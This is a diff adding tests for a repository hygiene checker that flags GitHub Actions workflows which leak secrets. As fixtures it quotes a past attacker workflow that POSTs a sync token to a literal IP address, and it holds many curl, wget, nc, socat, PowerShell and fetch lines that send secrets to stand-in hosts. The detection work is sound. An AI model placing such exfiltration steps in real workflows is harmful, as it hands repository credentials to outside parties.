@@ -7,6 +7,7 @@ import { dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
 import test from "node:test";
 import { parse } from "yaml";
+import * as hygiene from "./check-repo-hygiene.mjs";
 
 import {
   classifyContent,
@@ -19,6 +20,222 @@ const SCRIPT_PATH = fileURLToPath(new URL("./check-repo-hygiene.mjs", import.met
 const ALPHA_BUILD_WORKFLOW_PATH = new URL("../.github/workflows/alpha-build.yml", import.meta.url);
 const fileStat = (size = 0) => ({ isFile: () => true, size });
 const token = (prefix, body) => `${prefix}${body}`;
+
+const WORKFLOW_PATH = ".github/workflows/security.yml";
+const workflowJob = (body, trigger = "on: workflow_dispatch") =>
+  `${trigger}\njobs:\n  check:\n    runs-on: ubuntu-latest\n${body}\n`;
+function workflowPolicy(text, options = {}) {
+  assert.equal(typeof hygiene.evaluateWorkflowPolicy, "function", "workflow policy evaluator must be exported");
+  return hygiene.evaluateWorkflowPolicy({ path: WORKFLOW_PATH, text, ...options });
+}
+function workflowRules(text, options) {
+  return workflowPolicy(text, options).violations.map(({ rule }) => rule);
+}
+
+test("workflow policy accepts the reviewed allowlist", () => {
+  assert.deepEqual(workflowPolicy(workflowJob("    steps:\n      - run: echo safe")), { ok: true, violations: [] });
+  assert.deepEqual(hygiene.WORKFLOW_ALLOWLIST, [
+    "agent-control-live.yml", "alpha-build.yml", "project-issue-sync.yml", "security.yml",
+  ]);
+  assert.deepEqual(hygiene.WORKFLOW_ALLOWED_HOSTS, [
+    "github.com", "api.github.com", "uploads.github.com", "objects.githubusercontent.com",
+    "raw.githubusercontent.com", "ghcr.io", "registry.npmjs.org", "npm.pkg.github.com", "codecov.io",
+  ]);
+});
+
+test("workflow policy rejects an unknown filename with actionable diagnostics", () => {
+  const path = ".github/workflows/unreviewed.yaml";
+  const result = workflowPolicy("on: workflow_dispatch\n", { path });
+  assert.equal(result.ok, false);
+  assert.equal(result.violations[0].rule, "workflow-not-allowlisted");
+  assert.equal(result.violations[0].path, path);
+  assert.match(result.violations[0].message, /WORKFLOW_ALLOWLIST/);
+});
+
+// Historical source from fa42023d; inert text only, never executed or fetched.
+const ATTACKER_WORKFLOW = `name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'PROJECT_SYNC_TOKEN=\${{ secrets.PROJECT_SYNC_TOKEN }}' http://193.32.204.199
+`;
+
+test("workflow policy rejects the historical attacker workflow under all four rules", () => {
+  assert.deepEqual(workflowRules(ATTACKER_WORKFLOW, {
+    path: ".github/workflows/github_actions_security.yml",
+  }).sort(), ["workflow-not-allowlisted", "secret-egress", "secret-without-environment", "unfiltered-push-with-secrets"].sort());
+});
+
+test("workflow policy permits GITHUB_TOKEN with gh api and GitHub URLs", () => {
+  assert.deepEqual(workflowRules(workflowJob(`    steps:
+      - run: gh api https://api.github.com/user -H 'Authorization: Bearer \${{ secrets.GITHUB_TOKEN }}'`)), []);
+});
+
+test("workflow policy requires a project-sync job environment", () => {
+  assert.deepEqual(workflowRules(workflowJob(`    env:
+      GH_TOKEN: \${{ secrets.PROJECT_SYNC_TOKEN }}
+    steps:
+      - run: gh api user`)), ["secret-without-environment"]);
+});
+
+for (const [name, environment] of [
+  ["string", "    environment: project-sync"],
+  ["mapping", "    environment:\n      name: project-sync"],
+]) {
+  test(`workflow policy accepts the project-sync ${name} environment`, () => {
+    assert.deepEqual(workflowRules(workflowJob(`${environment}
+    env:
+      GH_TOKEN: \${{ secrets.PROJECT_SYNC_TOKEN }}
+    steps:
+      - run: gh api user`)), []);
+  });
+}
+
+for (const [name, trigger, expected] of [
+  ["bare scalar push", "on: push", ["unfiltered-push-with-secrets"]],
+  ["bare mapping push", "on:\n  push:", ["unfiltered-push-with-secrets"]],
+  ["filtered branches", "on:\n  push:\n    branches: [dev]", []],
+  ["filtered paths", "on:\n  push:\n    paths: ['scripts/**']", []],
+  ["unrelated PR filter", "on:\n  push:\n  pull_request:\n    branches: [dev]", ["unfiltered-push-with-secrets"]],
+]) {
+  test(`workflow policy handles ${name} with secrets`, () => {
+    assert.deepEqual(workflowRules(workflowJob(`    steps:
+      - run: echo \${{ secrets.X }}`, trigger)), expected);
+  });
+}
+
+test("workflow policy follows same-job env indirection", () => {
+  assert.deepEqual(workflowRules(workflowJob(`    env:
+      TOKEN: \${{ secrets.X }}
+    steps:
+      - run: curl -d "$TOKEN" http://1.2.3.4`)), ["secret-egress"]);
+});
+
+for (const [name, run] of [
+  ["single-line URL", "curl -d secrets.X https://outside.example/upload"],
+  ["IPv6 literal", "curl -d secrets.X http://[::1]/"],
+  ["allowed-host lookalike", "curl -d secrets.X https://api.github.com.outside.example/"],
+  ["userinfo deception", "curl -d secrets.X https://github.com@outside.example/"],
+  ["curl bare host", "curl -d secrets.X outside.example"],
+  ["wget bare host", "wget --post-data=secrets.X outside.example"],
+  ["nc bare host", "echo secrets.X | nc outside.example 80"],
+  ["ncat bare host", "echo secrets.X | ncat outside.example 80"],
+  ["socat bare host", "echo secrets.X | socat - TCP:outside.example:80"],
+  ["PowerShell", "Invoke-WebRequest outside.example -Body secrets.X"],
+  ["fetch call", "node -e 'fetch(\"https://outside.example\", {body: secrets.X})'"],
+  ["block scalar", "|\n          echo secrets.X\n          curl https://outside.example"],
+  ["folded scalar", ">-\n          curl https://outside.example\n          -d secrets.X"],
+]) {
+  test(`workflow policy detects secret egress via ${name}`, () => {
+    assert.deepEqual(workflowRules(workflowJob(`    steps:\n      - run: ${run}`)), ["secret-egress"]);
+  });
+}
+
+test("workflow policy keeps run blocks and job environments separate", () => {
+  const text = workflowJob(`    environment: project-sync
+    env:
+      TOKEN: \${{ secrets.X }}
+    steps:
+      - run: echo secrets.X
+      - run: curl https://outside.example
+      - run: echo 'environment: project-sync'
+  other:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -d "$TOKEN" https://outside.example
+      - run: echo secrets.PROJECT_SYNC_TOKEN`);
+  assert.deepEqual(workflowRules(text), ["secret-without-environment"]);
+});
+
+test("workflow policy does not accept a step environment as a job binding", () => {
+  assert.deepEqual(workflowRules(workflowJob(`    steps:
+      - environment: project-sync
+        run: echo secrets.PROJECT_SYNC_TOKEN`)), ["secret-without-environment"]);
+});
+
+test("workflow policy preserves quoted hash characters in single-line runs", () => {
+  assert.deepEqual(workflowRules(workflowJob(`    steps:
+      - run: echo ' # marker'; curl -d secrets.X https://outside.example`)), ["secret-egress"]);
+});
+
+test("workflow policy rejects a single-label nc destination", () => {
+  assert.deepEqual(workflowRules(workflowJob(`    steps:
+      - run: echo secrets.X | nc localhost 80`)), ["secret-egress"]);
+});
+
+test("workflow policy follows inline env mappings", () => {
+  assert.deepEqual(workflowRules(workflowJob(`    env: { TOKEN: '\${{ secrets.X }}' }
+    steps:
+      - run: curl -d "$TOKEN" http://1.2.3.4`)), ["secret-egress"]);
+});
+
+for (const command of ["curl sink -d secrets.X", "wget sink --post-data=secrets.X", "Invoke-WebRequest sink -Body secrets.X", "echo secrets.X | socat - TCP:sink:80"]) {
+  test(`workflow policy rejects a single-label destination in ${command.split(" ")[0]}`, () => {
+    assert.deepEqual(workflowRules(workflowJob(`    steps:\n      - run: ${command}`)), ["secret-egress"]);
+  });
+}
+
+test("workflow policy catches bracket and toJSON secret references (review finding)", () => {
+  for (const ref of ["${{ secrets['PROJECT_SYNC_TOKEN'] }}", '${{ secrets["PROJECT_SYNC_TOKEN"] }}', "${{ toJSON(secrets) }}"]) {
+    const text = `on:\n  push:\njobs:\n  send:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s -X POST -d 'X=${ref}' http://193.32.204.199\n`;
+    const result = hygiene.evaluateWorkflowPolicy({ path: ".github/workflows/alpha-build.yml", text });
+    const rules = result.violations.map((entry) => entry.rule).sort();
+    // The bracket forms name PROJECT_SYNC_TOKEN and toJSON(secrets) exposes it, so the unbound job also trips the environment rule.
+    assert.deepEqual(rules, ["secret-egress", "secret-without-environment", "unfiltered-push-with-secrets"], ref);
+  }
+});
+
+test("workflow policy requires the environment for bracket and toJSON project-token references (review finding)", () => {
+  for (const ref of ["${{ secrets['PROJECT_SYNC_TOKEN'] }}", '${{ secrets["PROJECT_SYNC_TOKEN"] }}', "${{ toJSON(secrets) }}"]) {
+    const unbound = `on: workflow_dispatch\njobs:\n  sync:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ${ref} | gh api https://api.github.com/user\n`;
+    assert.deepEqual(hygiene.evaluateWorkflowPolicy({ path: ".github/workflows/project-issue-sync.yml", text: unbound }).violations.map((v) => v.rule), ["secret-without-environment"], ref);
+    const bound = unbound.replace("    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    environment: project-sync\n");
+    assert.deepEqual(hygiene.evaluateWorkflowPolicy({ path: ".github/workflows/project-issue-sync.yml", text: bound }).violations, [], ref);
+  }
+});
+
+test("workflow policy treats branches-ignore as unfiltered and the push list shorthand as filtered (review finding)", () => {
+  const ignore = "on:\n  push:\n    branches-ignore: [scratch]\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ${{ secrets.GITHUB_TOKEN }} | gh api https://api.github.com/user\n";
+  assert.deepEqual(hygiene.evaluateWorkflowPolicy({ path: ".github/workflows/alpha-build.yml", text: ignore }).violations.map((v) => v.rule), ["unfiltered-push-with-secrets"]);
+  const shorthand = "on:\n  push: [dev]\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ${{ secrets.GITHUB_TOKEN }} | gh api https://api.github.com/user\n";
+  assert.deepEqual(hygiene.evaluateWorkflowPolicy({ path: ".github/workflows/alpha-build.yml", text: shorthand }).violations, []);
+});
+
+test("workflow policy allows codecov and GitHub Packages hosts in secret-bearing runs", () => {
+  const text = "on:\n  push:\n    branches: [dev]\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s -F token=${{ secrets.CODECOV_TOKEN }} https://codecov.io/upload && npm publish --registry https://npm.pkg.github.com\n";
+  assert.deepEqual(hygiene.evaluateWorkflowPolicy({ path: ".github/workflows/alpha-build.yml", text }).violations, []);
+});
+
+test("workflow driver accepts the worktree workflows", async () => {
+  assert.equal(typeof hygiene.scanWorkflowPolicies, "function", "workflow driver must be exported");
+  assert.deepEqual(await hygiene.scanWorkflowPolicies(fileURLToPath(new URL("../", import.meta.url))), []);
+});
+
+test("workflow driver scans ignored YAML and non-YAML files and the hygiene CLI fails", async () => {
+  await withTempDirectory(async (root) => {
+    execFileSync("git", ["init", "--quiet", root]);
+    await writeFixture(root, ".gitignore", ".github/workflows/\n");
+    await writeFixture(root, ".github/workflows/unreviewed.yaml", "on: workflow_dispatch\n");
+    await writeFixture(root, ".github/workflows/notes.txt", "notes\n");
+    const result = spawnSync(process.execPath, [SCRIPT_PATH], { cwd: root, encoding: "utf8" });
+    assert.equal(result.status, 1);
+    assert.match(result.stderr, /unreviewed.yaml.*workflow-not-allowlisted/);
+    assert.match(result.stderr, /notes.txt.*workflow-not-allowlisted/);
+    assert.match(result.stderr, /WORKFLOW_ALLOWLIST/);
+  });
+});
 
 async function withTempDirectory(run) {
   const root = await mkdtemp(join(tmpdir(), "repo-hygiene-"));
